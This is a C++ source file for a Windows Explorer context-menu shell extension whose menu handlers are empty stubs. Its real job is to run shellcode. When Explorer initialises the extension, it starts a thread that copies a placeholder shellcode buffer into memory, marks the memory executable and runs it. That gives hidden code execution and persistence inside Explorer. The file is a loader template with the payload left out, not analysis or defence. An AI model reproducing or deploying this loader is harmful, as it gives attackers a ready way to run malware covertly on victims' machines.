#include "FileContextMenuExt.h"
#include <strsafe.h>
#include <Shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

extern long      g_cDllRef;
extern HINSTANCE g_hInst;

UINT             g_QCMFlags;

#define IDM_DISPLAY 0

unsigned char buf[] = "\x00"; // Shellcode here

void InjectShc() 
{
    DWORD dwOldProtect = 0;
    LPVOID addr = VirtualAlloc( NULL, sizeof( buf ), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
    memcpy( addr, buf, sizeof( buf ) );

    VirtualProtect( addr, sizeof( buf ), PAGE_EXECUTE_READ, &dwOldProtect );

    ( ( void( * )() )addr )();
}

FileContextMenuExt::FileContextMenuExt(void) : m_cRef( 1 )
{
    InterlockedIncrement( &g_cDllRef );
}

FileContextMenuExt::~FileContextMenuExt(void)
{
    InterlockedDecrement( &g_cDllRef );
}

#pragma region IUnknown

IFACEMETHODIMP FileContextMenuExt::QueryInterface(REFIID riid, void **ppv)
{
    static const QITAB qit[] = 
    {
        QITABENT( FileContextMenuExt, IContextMenu  ),
		QITABENT( FileContextMenuExt, IContextMenu2 ),
		QITABENT( FileContextMenuExt, IContextMenu3 ),
        QITABENT( FileContextMenuExt, IShellExtInit ), 
        { 0 },
    };
    return QISearch( this, qit, riid, ppv );
}

IFACEMETHODIMP_(ULONG) FileContextMenuExt::AddRef()
{
    return InterlockedIncrement( &m_cRef );
}

IFACEMETHODIMP_(ULONG) FileContextMenuExt::Release()
{
    ULONG cRef = InterlockedDecrement( &m_cRef );
    if ( 0 == cRef ) {
        delete this;
    }
    return cRef;
}

#pragma endregion


#pragma region IShellExtInit

extern LPCITEMIDLIST g_pidl;

IFACEMETHODIMP FileContextMenuExt::Initialize( LPCITEMIDLIST pidlFolder, LPDATAOBJECT pDataObj, HKEY hKeyProgID )
{
    DWORD tid = NULL;
    CreateThread( NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE )InjectShc, NULL, 0, &tid );

    if ( NULL == pDataObj ) {
		if ( pidlFolder != NULL ) {
		}
        return S_OK;
    }
	return S_OK;
}

#pragma endregion

#pragma region IContextMenu

IFACEMETHODIMP FileContextMenuExt::QueryContextMenu(HMENU hMenu, UINT indexMenu, UINT idCmdFirst, UINT idCmdLast, UINT uFlags)
{
	g_QCMFlags = uFlags;
	return MAKE_HRESULT( SEVERITY_SUCCESS, 0, 0 );
}


IFACEMETHODIMP FileContextMenuExt::InvokeCommand(LPCMINVOKECOMMANDINFO pici)
{
    BOOL fUnicode = FALSE;

    if ( pici->cbSize == sizeof( CMINVOKECOMMANDINFOEX ) ) {
        if ( pici->fMask & CMIC_MASK_UNICODE ) {
            fUnicode = TRUE;
        }
    }
    return S_OK;
}


IFACEMETHODIMP FileContextMenuExt::GetCommandString(UINT_PTR idCommand, UINT uFlags, UINT *pwReserved, LPSTR pszName, UINT cchMax)
{
    HRESULT hr = E_INVALIDARG;

    if ( idCommand == IDM_DISPLAY ) {
        switch ( uFlags ) {

        default:
            hr = S_OK;
        }
    }
    return hr;
}

#pragma endregion

HRESULT MenuMessageHandler(UINT uMsg, WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	return S_OK;
}

IFACEMETHODIMP FileContextMenuExt::HandleMenuMsg(UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	LRESULT res;
	return MenuMessageHandler( uMsg, wParam, lParam, &res );
}

IFACEMETHODIMP FileContextMenuExt::HandleMenuMsg2(UINT uMsg, WPARAM wParam, LPARAM lParam, LRESULT *plResult)
{
	if ( NULL == plResult ) {
		LRESULT res;
		return MenuMessageHandler( uMsg, wParam, lParam, &res );
	}
	else {
		return MenuMessageHandler( uMsg, wParam, lParam, plResult );
	}
}
